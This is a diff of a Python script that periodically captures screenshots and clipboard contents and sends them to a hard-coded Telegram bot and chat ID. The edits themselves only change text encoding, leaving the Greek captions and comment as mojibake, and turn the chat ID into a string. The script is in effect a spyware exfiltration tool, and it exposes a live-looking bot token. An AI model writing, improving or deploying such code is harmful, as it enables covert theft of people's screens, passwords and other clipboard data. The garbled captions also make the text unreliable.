@@ -1,4 +1,4 @@
-import time
+﻿import time
 import os
 import pyautogui
 import hashlib
@@ -8,9 +8,9 @@ from PIL import Image
 from io import BytesIO
 
 TOKEN = '7573715897:AAGgNmOxIOrRywzihuF4jFYkBTU9ymvwgn0'
-CHAT_ID = 1837395252
+CHAT_ID = "1837395252"
 
-INTERVAL = 1800  # 30 λεπτά
+INTERVAL = 1800  # 30 Î»ÎµÏ€Ï„Î¬
 LAST_IMG_HASH = None
 LAST_CLIP_HASH = None
 bot = telebot.TeleBot(TOKEN)
@@ -29,10 +29,10 @@ def get_clipboard_hash():
         return None, None
 
 def send_screenshot(img_bytes):
-    bot.send_photo(CHAT_ID, img_bytes, caption="📸 Νέο screenshot εντοπίστηκε")
+    bot.send_photo(CHAT_ID, img_bytes, caption="ðŸ“¸ ÎÎ­Î¿ screenshot ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÏ„Î·ÎºÎµ")
 
 def send_clipboard(text):
-    bot.send_message(CHAT_ID, f"📋 Νέο Clipboard:\n{text[:4000]}")
+    bot.send_message(CHAT_ID, f"ðŸ“‹ ÎÎ­Î¿ Clipboard:\n{text[:4000]}")
 
 while True:
     try:
